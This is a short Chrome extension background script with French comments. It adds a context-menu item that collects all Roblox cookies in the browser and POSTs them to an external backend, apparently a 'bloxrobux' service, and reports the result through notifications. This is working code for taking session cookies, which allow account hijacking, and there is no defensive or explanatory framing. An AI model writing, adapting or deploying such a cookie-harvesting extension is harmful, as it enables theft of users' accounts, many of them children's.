console.log("🔥 background.js chargé");

// Créer le menu dès l'installation
chrome.runtime.onInstalled.addListener(() => {
  chrome.contextMenus.create({
    id: "sendCookies",
    title: "Envoyer mes cookies Roblox",
    contexts: ["action"]
  });
});

// Listener pour le clic sur le menu contextuel
chrome.contextMenus.onClicked.addListener((info) => {
  if (info.menuItemId !== "sendCookies") return;

  console.log("🖱️ Menu cliqué");

  // Récupérer tous les cookies Roblox
  chrome.cookies.getAll({ domain: ".roblox.com" }, async (cookies) => {
    console.log(`🍪 Cookies trouvés : ${cookies.length}`);

    if (cookies.length === 0) {
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon.png",
        title: "Aucun cookie trouvé",
        message: "Aucun cookie Roblox n’a été trouvé."
      });
      return;
    }

    // Envoyer les cookies au backend
    try {
      const response = await fetch("https://bloxrobux-backend.onrender.com/api/receive-cookies", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Authorization": "Bearer SUPER_SECRET_TOKEN"
        },
        body: JSON.stringify(cookies)
      });

      if (response.ok) {
        chrome.notifications.create({
          type: "basic",
          iconUrl: "icon.png",
          title: "Succès",
          message: `${cookies.length} cookie(s) envoyés avec succès !`
        });
      } else {
        chrome.notifications.create({
          type: "basic",
          iconUrl: "icon.png",
          title: "Erreur",
          message: `Erreur lors de l'envoi : ${response.statusText}`
        });
      }
    } catch (err) {
      console.error("Erreur fetch:", err);
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icon.png",
        title: "Erreur",
        message: "Impossible d’envoyer les cookies. Vérifie la connexion."
      });
    }
  });
});
